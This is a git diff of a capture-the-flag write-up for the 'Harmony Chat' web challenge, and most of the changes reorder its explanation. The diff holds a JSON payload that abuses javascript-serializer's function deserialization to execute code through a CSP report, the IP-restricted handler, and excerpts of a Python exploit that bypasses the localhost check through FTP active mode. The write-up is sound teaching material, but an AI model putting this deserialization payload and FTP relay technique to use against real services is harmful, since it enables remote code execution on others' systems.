@@ -2,11 +2,17 @@
 
 ![main](./files/main.png)
 
-Harmony Chat is Web Challenge implemented Chat application.
+Harmony Chat is Web Challenge implementing Chat application.
 
 You can register/login user and inviting someone to chat room.
 
-challenge source is available in [here](./files/harmony.zip)
+- [Source](./files/harmony.zip)
+
+
+
+In utils.js, validateAndDecodeJSON calls fromJSON of `javascript-serializer` module.
+
+`javascript-serializer` is supported to deserialize function similar with `node-serialize` known as one of vulnerable modules.
 
 ```js
 const crypto = require("crypto")
@@ -25,9 +31,10 @@ utils.validateAndDecodeJSON = (data, jsonSchema) => {
   return json.fromJSON(decoded)
 }
 ```
-In utils.js, validateAndDecodeJSON calls fromJSON of `javascript-serializer` module.
 
-`javascript-serializer` is supported to deserialize function similar with `node-serialize` known as one of vulnerable module.
+After deserializing input, the csp-report property of the result will be used to create report (which is string typed)
+
+This means specific property of the report can be converted to string by calling their toString method.
 
 ```js
 const handleReport = (req, res) => {
@@ -86,9 +93,9 @@ const generateTextReport = report => {
 }
 ```
 
-After deserialized, the csp-report property of result used for constructing report which is string type.
+from the [docs](https://github.com/wix-incubator/javascript-serializer), We could know `javascript-serializer` allows to construct object by setting `___js-to-json-class___` property.
 
-This means specific property of the report can be converted to string by calling their toString method.
+So, below is actual input for executing script by `javascript-serializer`
 
 ```js
 const data = `{"csp-report":{"blocked-uri":"","document-uri":"","effective-directive":"","original-policy":"","referrer":"","status-code":"","violated-directive":"","source-file":{"toString":{"___js-to-json-class___":"Function","json":"console.log(process)"}}}}`;
@@ -97,9 +104,9 @@ const report = utils.validateAndDecodeJSON(data, REPORT_SCHEMA)
 console.error(generateTextReport(report["csp-report"]))
 ```
 
-from the [docs](https://github.com/wix-incubator/javascript-serializer), We could know `javascript-serializer` allows to constructor object by setting `___js-to-json-class___` property.
+How to trigger, handleReport called when it received POST request for `/csp-report` route.
 
-So, above is actual input for executing script by `javascript-serializer`
+And their body will be given to argument of vulnerable point.
 
 ```js
 const REPORT_URL = "/csp-report"
@@ -117,9 +124,9 @@ const ContentSecurityPolicy = (req, res, next) => {
 }
 ```
 
-How to trigger, handleReport called when it received POST request for `/csp-report` route.
+but there's ip restriction for the handleReport function.
 
-And their body will be given to argument of vulnerable point.
+We should bypass this with ftp active mode.
 
 ```js
 const isLocal = (req) => {
@@ -127,12 +134,6 @@ const isLocal = (req) => {
   return ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1"
 }
 ```
-
-but since there's ip restriction for the handleReport function.
-We should bypass this with ftp active mode.
-
-after writing valid http request to log,
-We can transfer it to any host using ftp.
 
 ```python
 from websocket import create_connection
@@ -215,3 +216,6 @@ p.sendline('retr ' + channel_id)
 
 p.interactive()
 ```
+
+after writing valid http request to log,
+We can transfer it to any host using ftp.
